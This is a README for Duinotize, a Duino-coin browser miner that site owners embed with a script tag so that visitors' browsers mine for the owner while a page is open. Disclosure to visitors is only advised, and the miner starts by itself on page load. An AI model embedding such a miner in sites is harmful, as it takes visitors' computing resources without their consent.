# Duinotize
_Duino-coin webminer/website monetizer_

Tired of showing users ads? Don't want to leak personal info to use Adsense? Use **Duinotize**! It's a fork of the official Duino-coin web miner designed to be easily integrated into any website, to generate passive income just from people visiting your website.

## Installation
Put the following code at the very bottom of the HTML page(s) you want the miner to run on:
```
<script src="https://mobilegmyt.github.io/Duinotize/duinotize.js" defer></script>
<div id="duinotize-config" username="rpinews" rigid="duinotize-rig"></div>
```
NOTE: You'll want to replace `rpinews` with your Duino account username and `duinotize-rig` with the alias you want it to show up as in the web wallet. Optionally, you can add a `difficulty` value set to a mining difficulty of either "MEDIUM", or "EXTREME" (LOW is set by default, as MEDIUM or EXTREME causes frequent socket disconnects and may get your account banned!).

Now, whenever that page is opened, the miner will start and output messages to the developer console. It will stop once the page is closed. Make sure to install the miner on a page where users will be on for awhile, otherwise the miner will start and stop immediately. You can see this in action at https://mobilegmyt.github.io/Duinotize/test/, or look [here](https://github.com/mobilegmYT/Duinotize/blob/main/test/index.html) for the source code to that page.

I HIGHLY reccomend you put a note somewhere on your website to tell visiters that there is a crypto miner running in the background (in some places it is illegal to mine crypto in the background without consent!), and optionally credit this repo.

## How it works
The program connects to the Duco server via a websocket, requests a mining job with the configured settings and solves it using [DUCO-S1](https://github.com/mobilegmYT/Duinotize/blob/main/hashes.js). It sents the result, the time it took, username and hashrate to the server which loads it onto your wallet.

## Credits
This project is a fork/continuation of https://github.com/VatsaDev/Mineuino as the original author seems to have abandoned it and the code is broken.
Thanks to LDarki from the Duino discord for helping with some of the code.

## Notes
- I made this in just 2 hours at 1AM, so if there are bugs PLEASE report them
- I also have never touched JS before, so if there are improvements that could be made to the code, please PR them in.
